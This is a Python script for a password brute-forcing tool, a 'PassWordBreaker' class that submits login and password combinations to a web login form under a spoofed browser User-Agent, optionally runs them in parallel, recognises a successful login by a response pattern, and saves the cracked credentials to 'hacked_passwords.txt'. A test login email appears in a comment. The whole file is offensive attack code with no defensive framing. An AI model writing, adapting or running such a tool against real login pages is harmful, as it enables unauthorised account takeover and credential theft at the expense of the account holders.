import multiprocessing
import time

import requests

# test login: vgwgsrnpxyybjnahtz@twzhhq.online

CONCURRENCY = False


class PassWordBreaker:

    def __init__(
            self,
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36",
            url="",
            good_pattern=None,
            bad_pattern=None,
            concurrency=0,
            func=None
    ):
        self.user_agent = user_agent
        self.stopped = False
        self.hacked = False
        self.url = url
        self.curr_login = ""
        self.good_pattern = good_pattern.rstrip("\n")
        self.bad_pattern = bad_pattern.rstrip("\n")
        self.hacked_passwords = func
        self.concurrency = concurrency

    def stop(self):
        self.stopped = True

    def try_password(self, password):
        print("Trying: ", self.curr_login.strip(), " ", password.strip())
        response = requests.post(self.url, data={
            "login": self.curr_login,
            "password": password
        }, headers={
            "User-Agent": self.user_agent
        })
        content = response.content.decode("utf-8")
        # with open(f"{password}.html", "w") as file:
        #     file.write(content)
        if content.startswith(self.good_pattern) and not content.startswith(self.bad_pattern):
            self.hacked = True
            print(time.time())
        if self.hacked:
            print("Hacked login is: ", self.curr_login)
            print("Hacked password is:", password)
            with open("hacked_passwords.txt", "a") as file:
                file.write(f"{self.curr_login}:{password}\n")
            self.hacked = False
        else:
            print("Fail")
        print(time.time())
        if self.stopped:
            return None

    def break_password(self, logins, passwords, url):
        self.stopped = False
        self.logins = logins
        self.url = url
        print(time.time())
        for login in logins:
            self.curr_login = login
            if self.concurrency:
                with multiprocessing.Pool() as pool:
                    pool.map(self.try_password, passwords)
            else:
                for password in passwords:
                    self.try_password(password)
